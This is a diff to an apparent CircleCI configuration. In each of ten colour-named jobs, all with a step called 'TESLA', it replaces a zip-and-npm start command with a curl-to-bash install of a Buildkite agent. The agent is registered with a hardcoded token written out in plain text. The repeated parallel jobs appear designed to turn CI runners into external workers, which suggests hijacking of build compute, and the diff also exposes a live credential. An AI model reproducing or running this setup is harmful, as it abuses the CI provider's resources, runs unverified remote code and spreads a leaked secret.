@@ -14,7 +14,7 @@ jobs:
           name: TESLA
           
           command: |
-              sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+              TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
             
             
   blue:
@@ -30,7 +30,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
   silver:
     
     docker:
@@ -44,7 +44,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
 
   yellow:
     
@@ -59,7 +59,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
   green:
     
     docker:
@@ -73,7 +73,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
 
   purple:
     
@@ -88,7 +88,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
 
   pink:
     
@@ -102,7 +102,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
 
   black:
     
@@ -117,7 +117,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
   white:
     
     docker:
@@ -131,7 +131,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
 
 
   grey:
@@ -147,7 +147,7 @@ jobs:
           name: TESLA
           
           command: |
-            sudo apt update;sudo apt install nodejs npm -y;unzip package.zip;npm start
+            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
 
 
 workflows:
